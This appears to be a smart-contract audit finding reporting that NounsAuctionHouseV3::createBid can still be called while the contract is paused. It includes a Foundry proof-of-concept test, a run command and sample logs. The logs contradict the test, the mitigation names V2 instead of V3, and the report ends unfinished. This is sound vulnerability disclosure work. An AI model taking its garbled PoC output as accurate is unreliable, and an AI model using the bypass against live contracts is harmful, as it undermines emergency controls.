# Bids can be made by calling NounsAuctionHouseV3::createBid even when protocol is paused

### Summary

Contract is pausable, however even when pause state is enabled, user can still bid in current auction, leading to pause mode ineffective and made be able to modify states changes

### Root Cause

The described issue occurs because NounsAuctionHouseV3::createBid can be called even when contract is in pause mode, allowing users to bid even in paused state.  
If the contract enters in pause state due to emergency situations, changes to contract state can be made as the following PoC shows.
https://github.com/sherlock-audit/2024-11-nounsdao/blob/8b6fb94f103134e751cf016e5c3f4185be89bb49/nouns-monorepo/packages/nouns-contracts/contracts/NounsAuctionHouseV3.sol#L145


### Internal pre-conditions

1. Admin pauses contract NounsAuctionHouseV3 due to emergency mode  


### External pre-conditions

1. Users call bid while contract NounsAuctionHouseV3 is in pause making it able to modify contract state  
 

### Attack Path

1. Admin sets contract to pause mode  
2. External user is able to perform bids on contract NounsAuctionHouseV3 even while in pause mode 

### Impact

Contract storage / logic can be modified by any user even when contract enter in paused state  
Likehood: High  
Impact: Low  
Severity: Medium  

### PoC

Add this code to test/foundry/Upgrade/UpgradeMainnetFork.t.sol under contract AuctionHouseUpgradeMainnetForkTest:  
```solidity
    function test_auctionHouseV3_bidWhenPaused() public {
        console.log("[i] Addresses");
        console.log("\tUser1 address => ",address(user1));
        console.log("\tUser2 address => ",address(user2));

        INounsAuctionHouseV3 auction = INounsAuctionHouseV3(AUCTION_HOUSE_PROXY_MAINNET);
        IStreamEscrow streamEscrow = auction.streamEscrow();
        auction.settleCurrentAndCreateNewAuction();

        address owner = IOwner(address(auction)).owner();
        uint96 nounId1 = auction.auction().nounId;

        //User1 bids
        console.log("\n");
        console.log("[i] User1 bids to auction");
        vm.prank(user1);
        auction.createBid{ value: 1 ether }(nounId1);

        console.log(
            "After bid current highest bidder ",
            auction.auction().bidder
        );

        //Owner pauses contract 
        console.log("\n");
        console.log("[i] Owner pauses contract");
        vm.prank(owner);
        auction.pause();

        //User2 bids
        console.log("\n");
        console.log("[i] User2 bids to auction ");
        vm.prank(user2);
        auction.createBid{ value: 2 ether }(nounId1);

        console.log(
            "After bid current highest bidder ",
            auction.auction().bidder
        );

        vm.warp(block.timestamp + auction.auction().endTime);
    }
```
Exec test with:  
```bash
forge test --mt test_auctionHouseV3_bidWhenPaused -vv
```
Observe in the logs that users can still bid in auction even after contract enter pause state:  
```bash
Logs:
  foundry profile:  default

  	User2 address =>  0x537C8f3d3E18dF5517a58B3fB9D9143697996802
  

  [i] User1 bids to auction

  After bid current highest bidder  0x537C8f3d3E18dF5517a58B3fB9D9143697996802
```

### Mitigation

Implement whenNotPaused modifier in NounsAuctionHouseV2::createBid function:
